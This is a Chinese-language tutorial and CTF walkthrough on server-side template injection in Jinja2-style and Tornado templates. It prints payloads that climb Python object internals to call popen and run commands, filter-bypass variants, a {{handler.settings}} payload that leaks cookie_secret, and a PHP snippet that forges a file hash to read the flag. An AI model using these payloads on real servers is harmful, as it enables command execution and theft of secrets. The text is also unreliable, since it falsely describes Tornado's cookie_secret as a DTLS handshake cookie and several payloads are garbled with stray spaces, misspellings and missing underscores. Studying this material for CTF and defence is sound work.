# ssti模板注入和tornado模板注入

## ssti模板和tornado模板注入

产生模板注入的原因：是因为没有对用户的输入进行相应的检查，过分相信用户的输入导致的，由于在ssti模板和tornado模板中存在render渲染函数和 template渲染函数，因此当用户输入信息时
                                render函数和 template函数对输入的信息进行执行，并将结果渲染回页面，此时用户的输入是可控的，而且也没有对输入的信息进行审计，导致可能会出现一些恶意的代码。


### render函数和 template函数

对里面的信息进行渲染和返回页面

模板中可能的代码
```
render($_GET['msg'])

template($_GET['msg'])
```
对输入的信息进行执行并渲染回页面

### 用户输入恶意信息的格式：
```
{{.......}}装载一个变量

{%......%}装载一个控制语句

{#.......#}渲染时，注释中间的内容
```

## 对ssti模板中类的调用

用空格来知道并调用我们需要的类

查找模板中的类
```
{{' '._ _class_ _}}
```

查找模板类中的基类，一般为object类，有时不止一个基类，可以使用mro来显示所有基类，bases也可以显示所有基类
```
{{' '._ _class_ _._ _bases_ _}}

{{' '._ _class_ _._ _mro_ _}}
```

查找模板类中的基类的子类的集合，[0]是所有基类中的第一个基类
```
{{' '._ _class_ _._ _bases_ _[0]._ _subclasse_ _}}
```

查找模板类中的基类的子类的初始类，并用globals全局来查找所有的方法及变量及参数，()[118]是在模板类中的基类的第119个子类，['popen']('dir')是调用模板类中的基类的第119个子类的初始类的function popen中的dir来打开文件
```
{{' '._ _class_ _._ _bases_ _[0]._ _subclasse_ _()[118]._ _init_ _._ _globals_ _['popen']('dir').read()}}
```

实例
```
http://127.0.0.1:5000/test?{{"".__class__.__bases__[0].__subclasses__()[118].__init__.__globals__['popen']('dir').read()}}  //打开文件并读取
```

## 模板注入可能有些过滤的绕过方法

### 绕过[]过滤

使用gititem绕过。
```
原poc {{"".class.bases[0]}}

绕过后{{"".class.bases.getitem(0)}}
```

### 过滤了subclasses，拼凑法
```
原poc{{"".class.bases[0].subclasses()}}

绕过 {{"".class.bases[0]'subcla'+'sses'}}
```

### 过滤了class
```
{{session['__cla'+'ss__'].__mro__[12]}}


{{request['__cl'+'ass__'].__mro__[12]}}
```

## tornado模板注入

tornado模板注入和以上ssti模板注入类似，不过tornado模板中，存在一些可以快速访问的对象，例如：handler.settings(环境变量)

而cookie_secret就在handler.settings中

## cookie_secret

是在DTLS握手过程中的生成和需要验证的cookie值

DTLS协议是对广播发送UDP报文的加密，且可以防止中断攻击，以为在建立握手时，客户端会发送client-hello请求，此时服务器会生成一个cookie值放在Hello-Verify-Request报文中，
此时客户端收到后需将收到的cookie值放到client-hello中，并再发送给服务器，服务器收到后对比cookie值，相同才分配资源。


## 实例（tornado模板注入）
打开网页后看到三个文件，分别时flag.txt、welcome.txt和hint.txt，各自打开文件，发现payload有filename&filehash的get的提交方式，有此可知，需要这两个变量都满足变量才能显示文件的内容



而打开三个文件后发现flag在/flllllllllllag文件下，且有render渲染函数，且知道了filehash的加密方式


此时需要我们找到cookie_secret值，此时我们在filename中输入flllllllllllag，发现报错，且payload为/error?msg=error，因此我们可以使用tornado模板中，存在一些可以快速访问的对象的特性，来构造payload
```
error?msg={{handler.settings}}
```

此时我们得到cookie_secret的值

然后我们构造exp
```
<?php
echo md5('f03d04f0-456b-4577-b431-bd29fd3292d2'.md5("/fllllllllllllag"));
?>
```

得出fliehash值后代入即可得到flag






